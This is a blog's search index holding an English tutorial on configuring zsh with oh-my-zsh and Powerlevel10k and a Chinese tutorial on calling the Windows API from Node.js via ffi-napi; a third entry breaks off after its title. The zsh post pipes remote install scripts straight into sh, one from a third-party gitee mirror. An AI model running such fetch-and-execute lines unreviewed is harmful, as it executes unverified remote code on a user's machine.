<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Setting Up zsh with oh-my-zsh, Powerlevel10k, and Tabby Terminal</title>
      <link href="/2025/06/17/2025/terminal-zsh-p10k/"/>
      <url>/2025/06/17/2025/terminal-zsh-p10k/</url>
      
        <content type="html"><![CDATA[<p>Configure the <strong>zsh</strong> shell along with <strong>oh-my-zsh</strong>, the <strong>powerlevel10k</strong> theme, and the <strong>Tabby</strong> terminal emulator.</p><h2 id="Effect-Preview"><a href="#Effect-Preview" class="headerlink" title="Effect Preview"></a>Effect Preview</h2><p>Before we begin, let us take a look at the final result. This will help you decide whether to continue reading this article!</p><p>In Tabby on Arch Linux with KDE.</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/image2506/image-20250617115102399.png" alt="image-20250617115102399"></p><p>In Termius connected to Rocky Linux.</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/image2506/image-20250617115554812.png" alt="image-20250617115554812"></p><p>If you are satisfied with the above effect, you can learn how to configure it by reading this tutorial.</p><h2 id="Configuration-Tutorial"><a href="#Configuration-Tutorial" class="headerlink" title="Configuration Tutorial"></a>Configuration Tutorial</h2><h3 id="Install-ZSH"><a href="#Install-ZSH" class="headerlink" title="Install ZSH"></a>Install ZSH</h3><p>Firstly, install <strong>zsh</strong> on your Arch Linux from the Pacman repositories.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -Syu zsh</span><br></pre></td></tr></table></figure><p>In other tutorials, you may come across instructions suggestions that you should run the following command to set zsh as your default shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure><p>However, if you choose to use zsh with oh-my-zsh, this command is not necessary. During the installation of oh-my-zsh, zsh will automatically be set as the default shell on your operating system.</p><h3 id="Install-oh-my-zsh"><a href="#Install-oh-my-zsh" class="headerlink" title="Install oh-my-zsh"></a>Install oh-my-zsh</h3><p>Secondly, use the <strong>curl</strong> tool to download the <strong>oh-my-zsh</strong> installation script and execute it with the following command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>If you are located in China, you can run the following command instead. This will ensure that you can access the installation script more reliably:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/lxyoucan/tools/raw/master/common/ohmyzshinstall.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>Once everything is set up, your shell will automatically switch to zsh.</p><h3 id="Configure-Powerlevel10k-theme"><a href="#Configure-Powerlevel10k-theme" class="headerlink" title="Configure Powerlevel10k theme"></a>Configure Powerlevel10k theme</h3><p>Powerlevel10k is a zsh theme that emphasizes performance, flexibility, and out-of-the-box usability, while also offering extensive customization options. With the customizable capabilities of p10k(short of Powerlevel10k), you can achieve similar effects to other themes, but even greater power and versatility.</p><p>You may have noticed that there are many icons used in the terminal.</p><p>The icons used in p10k are essentially glyphs that are part of specific fonts designed to support these visual elements. These icons are not standard ASCII characters; instead, they are special characters that require a compatible font to display correctly.</p><p>Many fonts do not include these glyphs, which is why you might see empty boxes or question marks instead of the intended icons. To ensure proper display of p10k icons, it’s important to use a font that supports these glyphs, such as Nerd Fonts or other patched fonts specifically designed for terminal use.</p><p>So we install the Nerd Fonts before configuring p10k, and I recommend using <code>ttf-jetbrains-mono-nerd</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S ttf-jetbrains-mono-nerd</span><br></pre></td></tr></table></figure><p>Then installs the p10k theme into the appropriate directory for use with oh-my-zsh:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure><p>Edit your <code>~/.zshrc</code> and change the <code>ZSH_THEME</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=<span class="string">&quot;powerlevel10k/powerlevel10k&quot;</span></span><br></pre></td></tr></table></figure><p>Then reload your shell via the following command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><p>Then you can customize your zsh p10k according to your preferences. If you want to reconfigure your p10k theme, just execute the following command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure><h2 id="Terminal-Emulator"><a href="#Terminal-Emulator" class="headerlink" title="Terminal Emulator"></a>Terminal Emulator</h2><p><strong>Warp</strong> and <strong>Tabby</strong> are terminal emulators, while <strong>zsh</strong> (Z Shell) is a command-line shell.</p><p>I enjoy using <strong>Tabby</strong>, which is an excellent terminal that combines high performance, an elegant appearance, and all the necessary features. <strong>I am also using Tabby on my Arch Linux now.</strong></p><p>Tabby Official Website: <a href="https://tabby.sh/">https://tabby.sh/</a></p><p><strong>Warp</strong> is a recently emerging and impressive intelligent terminal that comes with built-in AI capabilities. You can use <code>Ctrl + I</code> to access the AI-powered command line, which can help automate certain tasks in the terminal.</p><p>Based on my personal experience, Warp AI is quite impressive and can assist me in completing many tasks, saving me a significant amount of time that I would otherwise spend on documentation and trial-and-error. However, for free users, Warp’s AI question-and-answer feature has a usage limit, and there are some display issues when using Warp on Arch Linux.</p><p>Warp Official Website: <a href="https://www.warp.dev/">https://www.warp.dev/</a></p><p>Providing my Tabby appearance configuration here for your reference. The font used is the <code>JetBrainsMonoNL Nerd Font Mono</code> mentioned earlier:</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/image2506/image-20250617125135317.png" alt="image-20250617125135317"></p><p>END.</p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zsh </tag>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025版Nodejs基于ffi-napi实现调用windows API</title>
      <link href="/2025/01/21/2025/nodejs-ffinapi/"/>
      <url>/2025/01/21/2025/nodejs-ffinapi/</url>
      
        <content type="html"><![CDATA[<p>如题，我想实现的效果是：Electron桌面应用实时监测用户聚焦的软件，将正在使用的软件名称展示给用户并同步到Web服务端。本文只展示Nodejs脚本如何基于ffi-napi实现调用windows API获取用户聚焦的软件名称并展示给用户，不提及与Web服务端的交互（实际上就是省略了签名认证发包同步数据的过程）。</p><blockquote><p>这个需求来自于我正在开发的小项目WhatAmIDoing，等基本功能完成时估计会另写篇文章说说实现思路，项目地址：<a href="https://github.com/ma5hr00m/WhatAmIDoing">kinoko&#x2F;WhatAmIDoin · GitHub</a>（虽然现在是private）</p></blockquote><p>这次经历略显折磨，Electron桌面开发是我之前没太涉及过的领域，然后环境配置的关键步骤正好又没什么完善的文档，恰好配置过程中各种关于环境版本的小坑还不少，所以折腾了一天。虽然最后降低了node版本有点委曲求全，但所幸还是解决了问题。</p><p>关键应用及版本：</p><ul><li>windows10</li><li>Microsoft Visual Studio2022</li><li>node v16.17.0 | npm v8.15.0 | pnpm v6.35.1</li><li>electron@34</li><li>python 3.12.7</li></ul><p>网上不少相关文章会要求降低node版本到node@12，我没搞清楚为什么要降低这么多，我个人是在node@16即可成功安装。不过我也暂时没找到在node@18+版本中使用ffi-napi的方法。</p><h2 id="node为什么不能直接调用windows-api"><a href="#node为什么不能直接调用windows-api" class="headerlink" title="node为什么不能直接调用windows api"></a>node为什么不能直接调用windows api</h2><p>简单来说就是封装了太多层，为了跨平台的特性舍弃了直接调用windows api的能力。</p><p>先有的javascript再有的nodejs，而javascript被发明之初也只是为了能实现浏览器html页面的简单交互，为了简单易用甚至于放弃了class而转用原型链，这你就不能指望js本身有能和windows api直接交互的能力。而nodejs本身又是基于js运行时的环境，外面套了层引擎，比如著名的v8，更追求跨平台运行的能力，所以也不会说把调用windows api的能力放到首位。</p><blockquote><p>javascript运行原理可以先看看我这篇博客：<a href="https://blog.kinoko.fun/2024/02/10/how-js-run/#JS-Engine-%E5%BC%95%E6%93%8E">JavaScript执行原理</a>，不算很细，但做做了解也问题不大</p></blockquote><p>windows api这种本身也就能和c&#x2F;cpp等语言对接，后来开发者觉得不太行，nodejs作为服务端语言竟然不能和windows交互，所以ffi-napi这类库应运而生，实现nodejs调用dll的能力。</p><h2 id="环境配置-安装ffi-napi"><a href="#环境配置-安装ffi-napi" class="headerlink" title="环境配置-安装ffi-napi"></a>环境配置-安装ffi-napi</h2><p>说是环境配置，其实重点就一个，那就是怎么安装ffi-napi，网上也能搜到很多相关文章，但我没找到一篇涵盖所有坑的，我是在东拼西凑了几个解决方案之后才成功安装ffi-napi的。</p><p>这里先给出注意事项清单，下面会接着说明为什么要这么配置、怎么配置（有必要的话）以及关键步骤截图，整体来说其实不麻烦，甚至可以说简单，但如果你不了解这个领域同时网上还一堆杂七杂八抄来抄去的资料干扰视线时，这也可以变成一件麻烦事：</p><ul><li>安装python，node-gyp要用</li><li>安装node-gyp，这个是npm自带的，问题是最新版的ffi-napi目前只兼容了node-gyp&lt;10的版本，而&gt;&#x3D;18的npm自带的node-gyp&gt;&#x3D;10，所以为了能用ffi-napi，得降低node版本到node16，我使用的LTS版本是<a href="mailto:&#x6e;&#111;&#x64;&#x65;&#x40;&#49;&#x36;&#46;&#x31;&#55;&#46;&#x30;">node@16.17.0</a></li><li>通过visual studio installer安装C++桌面开发相关库</li><li>通过visual studio installer安装Spectre v14.2 x86&#x2F;64相关库</li><li>通过visual studio installer安装windows SDK，并且要和windows版本对应，注意msvs2022默认安装windows11 SDK，如果是你是win10则需要另外安装windows10 SDK</li><li>npm设置msvs版本变量<code>npm config set msvs_version 2022 --global</code></li><li>msbuild安装（msvs自带）并添加系统&#x2F;用户环境变量</li></ul><p>ok，大致了解之后，现在开始。</p><h3 id="安装python"><a href="#安装python" class="headerlink" title="安装python"></a>安装python</h3><p>windows10如何安装python就直接略过了，网上很多成熟的教程。</p><p>你可能搜到过一些文章，告诉你安装ffi-napi需要python2.x，比如这篇：<a href="https://www.cnblogs.com/onesea/p/15879795.html">node-ffi从入门到放弃(安装篇) - 威武的大萝卜 - 博客园</a>。</p><p>按照我的步骤走的话不需要降低python版本到2.x，我直接用的我之前安装过的python3.12，上述那篇文章是2022年发布的，应该是比较保守一些，整体环境版本都相对较老（比如文中提及的<code>msvs_version 2017</code>），估计是低版本的node-gyp仍然只支持使用python2.x的构建工具。</p><p>想了解了解可以看这篇文章：<a href="https://docs.pingcode.com/ask/ask-ask/178419.html">npm安装某些模块为什么需要python – PingCode</a></p><blockquote><p>npm在安装某些模块时需要Python是因为一些依赖包或者模块需要通过node-gyp进行编译，而node-gyp是一个跨平台的命令行工具，它依赖于Python来执行一系列构建操作。这些操作涉及到编译C或C++代码，主要是因为<strong>npm的一些包含原生C&#x2F;C++扩展的模块需要编译成机器码</strong>，这样才能在特定平台上运行，<strong>提高执行效率、直接操作硬件资源、实现与操作系统底层的交互</strong>。</p></blockquote><h3 id="降低node-npm版本适配node-gyp"><a href="#降低node-npm版本适配node-gyp" class="headerlink" title="降低node&#x2F;npm版本适配node-gyp"></a>降低node&#x2F;npm版本适配node-gyp</h3><p>使用nvm安装node&#x2F;npm，可以使用windows包管理器直接安装nvm，不需要手动安装：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoop install nvm</span><br></pre></td></tr></table></figure><p>然后windows下的nvm常见指令就不说了，看看就能明白，也可以去看我之前的文章。</p><p>然后问题回到ffi-napi的安装上。如果你使用的是node&gt;&#x3D;18的版本，对应版本的npm安装ffi-napi时会报错，其中有关键语句时：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&quot;call&quot;&#x27;</span> 不是内部或外部命令，也不是可运行的程序或[批处理文件]</span><br></pre></td></tr></table></figure><p>这是因为node-gyp&gt;10的版本不支持call命令，所以需要降低node-gyp版本；而<code>npm install</code>时使用的node-gyp库是npm自带的，可以理解为npm的依赖项，据我目前了解应该是没有单独降低npm内置node-gyp版本的方法，所以就需要降低npm版本。</p><p>降低到<a href="mailto:&#110;&#111;&#x64;&#101;&#64;&#x31;&#54;&#46;&#x31;&#x37;&#x2e;&#x30;">node@16.17.0</a>即可，对应<a href="mailto:&#x6e;&#x70;&#109;&#64;&#x38;&#x2e;&#x31;&#53;&#46;&#48;">npm@8.15.0</a>。使用以下指令查看全局node-gyp的版本，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm list <span class="literal">-g</span> node<span class="literal">-gyp</span></span><br></pre></td></tr></table></figure><p><img src="https://img.ma5hr00m.top/2025/20250121175639.png" alt="image.png"></p><h3 id="通过msvs安装各种环境及工具"><a href="#通过msvs安装各种环境及工具" class="headerlink" title="通过msvs安装各种环境及工具"></a>通过msvs安装各种环境及工具</h3><p>如前文所说，node-gyp需要环境和工具去编译cpp&#x2F;c相关库，所以我们这里需要自备cpp变异环境和部分工具；我们需要调用windows API，所以我们也要安装windows SDK。而这些环境及工具都可以通过Microsoft Visual Studio Installer安装。</p><ul><li>使用C++的桌面开发（MSBuidl等工具）</li><li>windows 10 SDK</li><li>MSVC v142</li><li>Spectre v14.2</li></ul><p><img src="https://img.ma5hr00m.top/2025/20250121180916.png" alt="image.png"></p><p>勾选图中这些框选的选项就可以，简单来说就是配置node-gyp需要的编译构建环境和工具。</p><h3 id="添加msbuild环境变量"><a href="#添加msbuild环境变量" class="headerlink" title="添加msbuild环境变量"></a>添加msbuild环境变量</h3><p>用户Path变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe</span><br></pre></td></tr></table></figure><p>系统Path变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319</span><br></pre></td></tr></table></figure><h3 id="npm设置msvs-version全局变量"><a href="#npm设置msvs-version全局变量" class="headerlink" title="npm设置msvs_version全局变量"></a>npm设置msvs_version全局变量</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> msvs_version <span class="number">2022</span> <span class="literal">--global</span></span><br></pre></td></tr></table></figure><hr><p>ok，以上步骤搞定之后，在对应项目中安装ffi-napi就不会报错了。下面我根据需求自定义ddl并在nodejs脚本中调用。</p><h2 id="编写js脚本验证可实现node调用自定义的dll"><a href="#编写js脚本验证可实现node调用自定义的dll" class="headerlink" title="编写js脚本验证可实现node调用自定义的dll"></a>编写js脚本验证可实现node调用自定义的dll</h2><p>dll（动态链接库）是一种包含可由多个程序共享的代码和数据的文件格式。它允许程序在运行时动态加载和链接库中的功能，而不是在编译时将所有代码静态链接到可执行文件中。这种机制使得程序可以节省内存，提高效率，并且便于更新和维护。</p><p>Windows API是微软为Windows操作系统提供的一组接口，允许开发者与操作系统进行交互。许多Windows API函数都是以dll的形式提供的，这意味着开发者可以通过调用这些DLL中的函数来实现各种操作系统功能，如文件管理、图形界面、网络通信等。</p><h3 id="编写dll"><a href="#编写dll" class="headerlink" title="编写dll"></a>编写dll</h3><p>敲代码之前先介绍点相关概念。我之前接触的Web开发中的很多模块是经过了层层封装的，和相对底层的部分有些距离。</p><p>主要就是介绍<a href="https://zh.wikipedia.org/wiki/%E5%8F%A5%E6%9F%84">句柄 - 维基百科，自由的百科全书</a>，可以先看看wiki.</p><blockquote><p>句柄（Handle）是一个用于标识和管理系统资源的抽象引用。它通常是一个整数或指针，代表操作系统中的某个对象，如窗口、文件、进程、线程等。通过句柄，程序可以对这些资源进行操作，而无需直接访问它们的内存地址。</p></blockquote><p>根据我们要实现的功能，这里自定义dll要做的事情就是先获取用户聚焦窗口的句柄<code>HWND</code>，然后基于窗口句柄获取进程ID，进而得到进程句柄<code>HANDLE</code>获取需要的软件名称。</p><p>启动msvs，创建基于cpp的dll项目，创建后有四个主要的文件，</p><ol><li><strong>dllmain.cpp</strong>：这是dll的入口点文件，包含了dll的初始化和清理代码。它定义了<code>DllMain</code>函数，该函数在dll被加载或卸载时被调用。你可以在这里执行一些初始化操作，比如分配资源，或者在dll卸载时释放资源。</li><li><strong>framework.h</strong>：这个头文件通常用于定义项目中使用的常量、宏、数据结构和函数声明。它可以包含其他必要的头文件，提供项目所需的基础功能。</li><li><strong>pch.cpp</strong>：这是预编译头文件的实现文件。预编译头可以加快编译速度，尤其是在包含大量头文件的项目中。这个文件通常包含了在<code>pch.h</code>中声明的内容。</li><li><strong>pch.h</strong>：这是预编译头文件，通常包含了项目中常用的头文件和库的引用。通过使用预编译头，可以减少编译时间，提高开发效率。</li></ol><p>要实现的功能比较简单，且我们目前只关注功能的实现，所以只修改dllmain.cpp即可，相关代码的功能以注释的形式放在代码块中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//**</span></span><br><span class="line"><span class="comment">// 导出函数，获取当前活动窗口的应用程序名称</span></span><br><span class="line"><span class="comment">// **/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">GetActiveWindowAppName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取当前活动窗口的句柄</span></span><br><span class="line">    HWND hwnd = <span class="built_in">GetForegroundWindow</span>();</span><br><span class="line">    <span class="keyword">if</span> (hwnd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No active window&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取活动窗口所属的进程ID</span></span><br><span class="line">    DWORD processID;</span><br><span class="line">    <span class="built_in">GetWindowThreadProcessId</span>(hwnd, &amp;processID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开进程以查询信息和读取内存</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unable to open process&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程的可执行文件名，因为获取到的是绝对路径，所以需要进行处理</span></span><br><span class="line">    <span class="type">char</span> processName[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetModuleFileNameExA</span>(hProcess, <span class="literal">NULL</span>, processName, <span class="built_in">sizeof</span>(processName) / <span class="built_in">sizeof</span>(<span class="type">char</span>))) &#123;</span><br><span class="line">        <span class="function">std::string <span class="title">fullPath</span><span class="params">(processName)</span></span>;</span><br><span class="line">        std::string appName = fullPath.<span class="built_in">substr</span>(fullPath.<span class="built_in">find_last_of</span>(<span class="string">&quot;\\&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        appName = appName.<span class="built_in">substr</span>(<span class="number">0</span>, appName.<span class="built_in">find_last_of</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> _strdup(appName.<span class="built_in">c_str</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Unable to get process name&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//**</span></span><br><span class="line"><span class="comment">// dll的入口点</span></span><br><span class="line"><span class="comment">// **//</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>msvs生成解决方案即可，这个构建的很快，然后输出中会直接给出绝对路径，后面要用（当然你也可以挪来挪去，但我觉得有绝对路径能cv了也很方便）。</p><p><img src="https://img.ma5hr00m.top/2025/20250121164030.png" alt="image.png"></p><h3 id="编写js脚本调用dll检验结果"><a href="#编写js脚本调用dll检验结果" class="headerlink" title="编写js脚本调用dll检验结果"></a>编写js脚本调用dll检验结果</h3><p>这里就不用create-electron-app这种库拉取electron项目模板了，手动创建项目，安装依赖。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install <span class="literal">--save-dev</span> electron ffi<span class="literal">-napi</span> ref<span class="literal">-napi</span></span><br></pre></td></tr></table></figure><p>我的package.json如下，其中<code>&quot;start&quot;: &quot;electron .&quot;</code>暂时用不到，下一小节创建electron应用的时候使用，对接下来的js脚本验证可实现node调用自定义的dll无影响。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron .&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;electron&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^34.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ffi-napi&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.0.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ref-napi&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.0.3&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后编写满足文章开头所说需求的脚本，调用生成好的dll文件监测本地用户聚焦的软件，注意替换dll路径即可（我设置的轮询间隔为2s）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ffi = <span class="built_in">require</span>(<span class="string">&#x27;ffi-napi&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userTracking = ffi.<span class="title class_">Library</span>(<span class="string">&#x27;C:\\your-path-to-dll\\UserTracking.dll&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;GetActiveWindowAppName&#x27;</span>: [<span class="string">&#x27;string&#x27;</span>, []]</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">printActiveAppName</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> appName = userTracking.<span class="title class_">GetActiveWindowAppName</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(appName);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(printActiveAppName, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure><p>然后node运行该文件，观察控制台，可以看到脚本正在运行，监测你正在用的软件</p><p><img src="https://img.ma5hr00m.top/2025/20250121161514.png" alt="image.png"></p><p>以上。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows-Api </tag>
            
            <tag> ffi-napi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>速速了解Gradle构建工具</title>
      <link href="/2025/01/14/2025/know-gradle/"/>
      <url>/2025/01/14/2025/know-gradle/</url>
      
